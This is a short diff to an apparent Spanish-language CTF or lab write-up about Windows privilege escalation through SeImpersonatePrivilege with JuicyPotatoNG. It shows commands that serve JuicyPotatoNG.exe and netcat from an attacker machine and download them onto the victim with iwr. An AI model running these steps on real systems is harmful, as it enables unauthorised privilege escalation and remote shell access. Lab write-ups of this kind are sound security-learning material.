@@ -149,9 +149,11 @@ Se comienza probando escaladas típicas de Windows.
 Ojo. Tenemos el privilegio ``SeImpersonatePrivilege``, por lo que podemos hacer uso de ``Potato``. Existen muchísimas opciones, pero en esta ocasión utilizaremos ``JuicyPotatoNG.exe``.
 
 Vamos a compartir tanto ``JuicyPotatoNG.exe`` como ``nc.exe``:
-- Abrimos servidor web con python en el directorio donde tengamos dichas utilidades: ``python3 -m http.server 80``
+- Abrimos servidor web con python en el directorio donde tengamos dichas utilidades en la máquina atacante: ``python3 -m http.server 80``
 - Hacemos solicitud desde la máquina víctima de dichos recursos:
+
 ``iwr http://10.10.10.4/JuicyPotatoNG.exe -o JuicyPotatoNG.exe``
+
 ``iwr http://10.10.10.4/nc64.exe -o nc.exe``
 
 ![23](Images/23.png)
